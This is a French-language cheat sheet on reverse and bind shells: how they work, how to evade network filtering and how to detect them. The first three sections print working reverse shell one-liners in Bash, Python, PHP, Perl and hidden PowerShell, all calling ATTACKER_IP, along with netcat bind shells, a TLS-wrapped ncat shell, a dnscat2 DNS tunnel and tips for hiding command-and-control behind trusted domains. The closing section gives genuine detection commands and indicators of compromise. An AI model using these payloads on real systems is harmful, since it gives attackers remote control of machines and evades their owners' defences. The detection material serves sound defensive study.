# Reverse & Bind Shells — Mécanique, Filtrage & Détection

---

## 1. Principes & Différences Fondamentales

### Flux d'initiation TCP

```
REVERSE SHELL
─────────────
Attaquant (listener)          Cible (exécution du payload)
    nc -lvnp 4444  ←──────── nc -e /bin/bash ATTACKER:4444
         ↑                           ↑
    bind():443               connect():4444
    accept()                 
    
Initiation : Cible → Attaquant
La cible sort (connexion EGRESS) vers l'attaquant qui écoute.

BIND SHELL
──────────
Attaquant (connexion)         Cible (listener)
    nc CIBLE_IP 4444 ────────→ nc -lvnp 4444 -e /bin/bash
                                      ↑
                               bind():4444 + accept()

Initiation : Attaquant → Cible
L'attaquant entre (connexion INGRESS) sur le port ouvert de la cible.
```

### Comportement face au NAT & Pare-feu

| Critère | Reverse Shell | Bind Shell |
| --- | --- | --- |
| Initiation TCP | Cible → Attaquant | Attaquant → Cible |
| Flux réseau | Sortant (EGRESS) depuis la cible | Entrant (INGRESS) vers la cible |
| Compatible NAT cible | ✓ (la cible initie) | ✗ (port entrant bloqué par NAT) |
| Compatible pare-feu entrant | ✓ | ✗ (port doit être ouvert en entrée) |
| Compatible pare-feu sortant | Dépend du port choisi | ✓ (l'attaquant initie vers l'extérieur) |
| Risque de détection | Connexion sortante inattendue | Port en écoute sur la cible |

!!! note "Cas d'usage bind shell"
    Le bind shell reste utile quand l'attaquant n'a **pas d'IP publique** accessible (lab interne, cible dans le même réseau, redirecteur intermédiaire) ou lors d'un mouvement latéral sur un réseau sans NAT entre les segments.

---

## 2. Mécanique des Sockets & Redirections E/S

### Principe de couplage socket ↔ descripteurs

```
Shell classique :
  STDIN  (fd 0) ← clavier
  STDOUT (fd 1) → terminal
  STDERR (fd 2) → terminal

Shell inverse :
  STDIN  (fd 0) ← socket réseau  (commandes de l'attaquant)
  STDOUT (fd 1) → socket réseau  (sortie vers l'attaquant)
  STDERR (fd 2) → socket réseau  (erreurs vers l'attaquant)

Objectif : faire pointer fd 0, 1 et 2 vers la socket TCP,
           puis spawner /bin/bash ou /bin/sh dans ce contexte.
```

### Payloads par langage — Mécanique socket expliquée

```bash
# Bash : redirection des descripteurs vers /dev/tcp (builtin bash)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# >& /dev/tcp/...      → redirige STDOUT + STDERR vers la socket
# 0>&1                 → redirige STDIN depuis STDOUT (la socket)
```

```python
# Python3 : socket → dup2 pour copier la socket sur fd 0, 1, 2
python3 -c '
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)   # socket → STDIN
os.dup2(s.fileno(),1)   # socket → STDOUT
os.dup2(s.fileno(),2)   # socket → STDERR
subprocess.call(["/bin/sh","-i"])
'
```

```php
# PHP : proc_open() connecte les pipes du processus à la socket
php -r '
$s=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);
'
```

```perl
# Perl : dup2 identique à Python
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in(4444,inet_aton("ATTACKER_IP")));
open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
exec("/bin/sh -i");
'
```

```powershell
# PowerShell : TCPClient + Stream couplés à cmd.exe
powershell -NoP -NonI -W Hidden -Exec Bypass -c "
\$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);
\$s=\$c.GetStream();
[byte[]]\$b=0..65535|%{0};
while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){
  \$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);
  \$r=(iex \$d 2>&1|Out-String);
  \$sb=[text.encoding]::ASCII.GetBytes(\$r);
  \$s.Write(\$sb,0,\$sb.Length)
}"
```

### Tableau récapitulatif des mécanismes

| Langage | Mécanisme de couplage | Descripteur fd |
| --- | --- | --- |
| Bash | `/dev/tcp` builtin + redirection `>&` | Implicite (via shell) |
| Python | `os.dup2(socket.fileno(), 0/1/2)` | Explicit fd 0, 1, 2 |
| PHP | `proc_open()` avec array socket | Pipes du processus |
| Perl | `open(STDIN,">&S")` | Filehandle → socket |
| PowerShell | `TCPClient.GetStream()` + `iex` | Stream .NET |

---

## 3. Contournement de Filtrage Réseau

### Choix des ports de sortie (EGRESS)

| Port | Service légitime | Raison du choix |
| --- | --- | --- |
| `80` | HTTP | Sortant autorisé sur presque tous les réseaux |
| `443` | HTTPS/TLS | Sortant autorisé + trafic chiffré (inspection SSL difficile) |
| `53` | DNS | Quasi-universellement ouvert → aussi utilisé pour le tunnelling |
| `8080` | HTTP alternatif | Souvent autorisé (proxy, dev) |
| `8443` | HTTPS alternatif | Idem 443 en alternatif |
| `3389` | RDP | Parfois autorisé en sortie sur les réseaux d'entreprise |

```bash
# Listener attaquant sur le port 443 (contourne les règles EGRESS basiques)
nc -lvnp 443
```

```bash
# Reverse shell vers le port 443 depuis la cible
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### Techniques de contournement avancées

```bash
# Encapsuler le shell dans du TLS (évite l'inspection DPI en clair)
ncat --ssl ATTACKER_IP 443 -e /bin/bash
```

```bash
# Tunnelling DNS (exfiltration + shell via requêtes DNS)
# Outils : iodine, dnscat2
dnscat2 --dns domain=tunnel.attacker.com
```

!!! warning "Filtrage EGRESS strict"
    Sur les réseaux d'entreprise avec inspection HTTPS (DPI/SSL Inspection), même le port 443 peut être inspecté. Utiliser `socat` avec un vrai certificat signé ou un domaine de confiance (CDN, GitHub, Pastebin) pour du C2 qui passe la vérification de certificat.

---

## 4. Indice de Détection & Threat Hunting

### Détection Linux — Connexions sortantes suspectes

```bash
# Lister les connexions ESTABLISHED avec le processus associé
ss -antp state established
```

```bash
# Filtrer les connexions non standard (hors navigateurs, apt, ssh)
ss -antp | grep -vE "firefox|chrome|apt|sshd|curl" | grep ESTABLISHED
```

```bash
# Identifier les processus avec une socket réseau ouverte (pivot sur PID)
lsof -i -n -P | grep -E "ESTABLISHED|LISTEN"
```

```bash
# Trouver les processus shell ayant un parent réseau (bash enfant d'un service web)
ps -ef | grep -E "bash|sh|python|perl" | grep -v grep
pstree -p | grep -E "(bash|sh)\(\d+"
```

### Détection Windows — Get-NetTCPConnection

```powershell
# Lister les connexions établies avec le processus associé
Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | Sort RemotePort
```

```powershell
# Croiser les connexions avec les noms de processus
Get-NetTCPConnection -State Established | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Remote = "$($_.RemoteAddress):$($_.RemotePort)"
        PID    = $_.OwningProcess
        Name   = $proc.Name
        Path   = $proc.Path
    }
} | Where-Object { $_.Name -notmatch "chrome|firefox|svchost" }
```

### Indicateurs de compromission (IOC) typiques

| Indicateur | Signal |
| --- | --- |
| `bash`/`sh` avec PPID = `apache2`/`nginx`/`www-data` | Shell enfant d'un processus web |
| Connexion ESTABLISHED depuis `python3`/`perl`/`php` vers IP externe | Reverse shell interprété |
| Port 4444 / 1234 / 9999 en écoute sur la cible | Bind shell classique |
| `cmd.exe` ou `powershell.exe` avec PPID inhabituel | Shell Windows via exploit |
| Connexion sortante `nc`/`ncat`/`socat` vers port 443/80 | Reverse shell déguisé |
| `/dev/tcp` dans les arguments de `bash` (`/proc/PID/cmdline`) | Reverse shell bash |

!!! tip "Hunting rapide — Processus shell avec socket réseau"
    Croiser `ss -antp` (PID avec socket) et `ps --ppid PID` (enfants du processus) pour remonter la chaîne parent → enfant et identifier un interpréteur (`bash`, `python`) lancé par un service réseau (`apache`, `sshd`, `java`) — signature quasi-certaine d'un shell obtenu via exploitation.
